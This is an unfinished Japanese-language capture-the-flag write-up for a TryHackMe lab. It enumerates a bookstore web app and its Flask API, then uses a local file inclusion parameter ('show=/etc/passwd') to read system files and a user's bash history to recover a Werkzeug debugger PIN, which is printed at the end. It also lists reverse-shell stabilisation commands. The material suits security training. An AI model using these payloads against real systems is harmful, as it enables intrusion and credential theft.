# Bookstore CTF

https://tryhackme.com/room/bookstoreoc

## Enumeration

```shell
TARGET=10.10.6.40
sudo bash -c "echo $TARGET   bookstore.thm >> /etc/hosts"
```

### ポートスキャン

```shell
root@ip-10-10-185-30:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-29 05:59 BST
Nmap scan report for bookstore.thm (10.10.6.40)
Host is up (0.000097s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  upnp
MAC Address: 02:24:2E:92:79:F5 (Unknown)
```

```sh
root@ip-10-10-185-30:~# sudo nmap -sV -p22,80,5000 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-29 06:03 BST
Nmap scan report for bookstore.thm (10.10.6.40)
Host is up (0.000095s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
5000/tcp open  upnp?
```

```sh
sudo nmap -sS -oA ./nmap.txt --script safe -p5000 $TARGET

PORT     STATE SERVICE
5000/tcp open  upnp
MAC Address: 02:24:2E:92:79:F5 (Unknown)
```

SSH, HTTP。5000 ポートは UPNP？

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://bookstore.thm -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 315] [--> http://bookstore.thm/assets/]
/favicon.ico          (Status: 200) [Size: 15406]
/images               (Status: 301) [Size: 315] [--> http://bookstore.thm/images/]
/javascript           (Status: 301) [Size: 319] [--> http://bookstore.thm/javascript/]
/LICENSE.txt          (Status: 200) [Size: 17130]
/server-status        (Status: 403) [Size: 278]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

拡張子 html で再検索。

```
===============================================================
/assets               (Status: 301) [Size: 315] [--> http://bookstore.thm/assets/]
/books.html           (Status: 200) [Size: 2940]
/favicon.ico          (Status: 200) [Size: 15406]
/images               (Status: 301) [Size: 315] [--> http://bookstore.thm/images/]
/index.html           (Status: 200) [Size: 6452]
/javascript           (Status: 301) [Size: 319] [--> http://bookstore.thm/javascript/]
/login.html           (Status: 200) [Size: 5325]
/server-status        (Status: 403) [Size: 278]
Progress: 454380 / 454382 (100.00%)
===============================================================
Finished
===============================================================
```

/login.html

GET パラメータでユーザー名とパスワードを送信している。また、興味深いコメント。

```html
<script src="more_css/js/main.js"></script>

<!--Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file -->
```

/javascript ディレクトリの中に興味深い js ファイルがあった。

api.js

```js
function getAPIURL() {
  var str = window.location.hostname;
  str = str + ":5000";
  return str;
}

async function getUsers() {
  var u = getAPIURL();
  let url = "http://" + u + "/api/v2/resources/books/random4";
  try {
    let res = await fetch(url);
    return await res.json();
  } catch (error) {
    console.log(error);
  }
}

async function renderUsers() {
  let users = await getUsers();
  let html = "";
  users.forEach((user) => {
    let htmlSegment = `<div class="user">
	 	        <h2>Title : ${user.title}</h3> <br>
                        <h3>First Sentence : </h3> <br>
			<h4>${user.first_sentence}</h4><br>
                        <h1>Author: ${user.author} </h1> <br> <br>        
                </div>`;

    html += htmlSegment;
  });

  let container = document.getElementById("respons");
  container.innerHTML = html;
}
renderUsers();
//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.
```

/books.html にアクセスすると、下記リクエストを送信している。5000 ポートは API 用だった。

```http
GET /api/v2/resources/books/random4 HTTP/1.1
Host: 10.10.6.40:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.6.40/
Origin: http://10.10.6.40
Connection: keep-alive
Priority: u=4
Pragma: no-cache
Cache-Control: no-cache
```

http://10.10.6.40:5000/api/ を GET すると、API 仕様が表示された。

```
good API has a documentation we have one as well!
The various routes this API currently provides are:

/api/v2/resources/books/all (Retrieve all books and get the output in a json format)

/api/v2/resources/books/random4 (Retrieve 4 random records)

/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)

/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)

/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)

/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)
```

books 以外のエンドポイントをファジングする。

```sh
ffuf -u 'http://10.10.6.40:5000/api/v2/resources/FUZZ/all' -c

ffuf -u 'http://10.10.6.40:5000/api/v2/resources/FUZZ?id=1' -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fc 404

ffuf -u 'http://10.10.6.40:5000/api/v1/resources/FUZZ/all' -c

ffuf -u 'http://10.10.6.40:5000/api/v1/resources/FUZZ?id=1' -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fc 404
```

上記のパターンでは、books しか出なかった。v3 は books もヒットしないので、存在しないと思われる。

```sh
ffuf -u 'http://10.10.6.40:5000/FUZZ' -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt -fc 404
```

これもヒットしない。

```sh
$ dirsearch --url http://bookstore.thm:5000
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/ctf/bookstore/reports/http_bookstore.thm_5000/_25-05-29_15-40-43.txt

Target: http://bookstore.thm:5000/

[15:40:43] Starting:
[15:42:13] 200 -  825B  - /api
[15:42:13] 200 -  825B  - /api/
[15:42:41] 400 -  167B  - /console
[15:44:14] 200 -   45B  - /robots.txt
```

robots.txt には /api だけ。

/console が存在するが、リクエストの方法は不明。

```sh
$ curl -X POST http://bookstore.thm:5000/console
<!doctype html>
<html lang=en>
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>The browser (or proxy) sent a request that this server could not understand.</p>
```

js に下記のコメントがあることにここで気付いた。

```js
//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.
```

/api/v1 がターゲット。LFI を引き起こすパラメータがあるとのこと。

LFI がどう引き起こされるのか想像できないが、下記の形を試す。

```
/api/v2/resources/books?FUZZ=/etc/passwd
```

```sh
$ ffuf -u 'http://10.10.162.223:5000/api/v1/resources/books?FUZZ=/etc/passwd' -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fc 404

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.162.223:5000/api/v1/resources/books?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

author                  [Status: 200, Size: 3, Words: 1, Lines: 2, Duration: 272ms]
id                      [Status: 200, Size: 3, Words: 1, Lines: 2, Duration: 268ms]
published               [Status: 200, Size: 3, Words: 1, Lines: 2, Duration: 268ms]
show                    [Status: 200, Size: 2015, Words: 17, Lines: 38, Duration: 266ms]
:: Progress: [4744/4744] :: Job [1/1] :: 73 req/sec :: Duration: [0:01:05] :: Errors: 0 ::
```

show パラメータを発見！

http://10.10.162.223:5000/api/v1/resources/books?show=/etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sid:x:1000:1000:Sid,,,:/home/sid:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
systemd-timesync:x:111:116:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
tss:x:112:119:TPM software stack,,,:/var/lib/tpm:/bin/false
tcpdump:x:113:120::/nonexistent:/usr/sbin/nologin
fwupd-refresh:x:114:121:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
usbmux:x:115:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
```

sid, ubuntu ユーザーが存在。

ログイン画面のこのコメントを思い出す。

```html
<!--Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file -->
```

http://10.10.162.223:5000/api/v1/resources/books?show=/home/sid/.bash_history

```
cd /home/sid whoami export WERKZEUG_DEBUG_PIN=[REDACTED] echo $WERKZEUG_DEBUG_PIN python3 /home/sid/api.py ls exit
```

WERKZEUG_DEBUG_PIN でググって、下記のページを確認。

https://werkzeug.palletsprojects.com/en/stable/debug/

要約すると、

- デバッガーが ON の場合、エラー発生時に一般的な内部エラーではなく詳細なトレースバックが表示される
- インタラクティブに任意の Python コードを実行できる
- コンソールを初めて開くとき、PIN の入力が求められる

問題はどうやって内部エラーを発生させるか？

どうしても 404 以外のエラーを発生させられない。

また、普通は /console にアクセスしたら表示されるようだが・・・

→ /console で Bad Request にならず、PIN を聞かれるのが期待動作と判明。ルームバグとして報告済み。対応待ちのため一時中断する。

## 権限昇格

## 振り返り

- /console で Bad Request が返る
-

## シェル安定化メモ

```shell
# python が無くても、python3 でいける場合もある
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Ctrl+Z でバックグラウンドにした後に
stty raw -echo; fg

#（終了後）エコー無効にして入力非表示になっているので
reset

# まず、他のターミナルを開いて rows, columns の値を調べる
stty -a

# リバースシェルで rows, cols を設定する
stty rows 52
stty cols 236

```

WERKZEUG_DEBUG_PIN=123-321-135
